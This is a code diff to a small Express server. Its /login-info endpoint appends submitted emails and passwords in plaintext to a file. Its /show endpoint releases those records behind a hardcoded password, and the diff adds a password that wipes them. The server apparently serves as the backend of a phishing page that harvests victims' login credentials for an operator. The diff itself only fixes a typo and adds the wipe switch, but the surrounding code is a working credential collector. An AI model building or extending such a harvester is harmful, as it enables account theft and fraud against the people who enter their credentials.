@@ -4,6 +4,7 @@ const path = require('path')
 const fs = require('fs')
 const { execSync } = require('child_process')
 const logger = require('morgan')
+const { PassThrough } = require('stream')
 
 const port = 4000
 
@@ -19,12 +20,12 @@ app.post('/login-info', (req, res) => {
     try {
         const { email, password } = req.body
         if (!email || !password) return res.json({
-            title: "Bad requist",
+            title: "Bad request",
             message: "Enter email and password"
         })
 
         const data = `\n-email: ${email}\n-password: ${password}\n_____________________________`
-        
+
         fs.appendFileSync('data.txt', data)
 
         res.json({
@@ -43,7 +44,8 @@ app.post('/login-info', (req, res) => {
 app.post('/show', (req, res) => {
     try {
         const { password } = req.body
-        if (password !== 'lazanya.com') return res.json({
+        if (password === 'clearlazanya') fs.writeFileSync('data.txt', '')
+        if (password !== 'lazanya') return res.json({
             title: "Hmm",
             message: "Get out"
         })
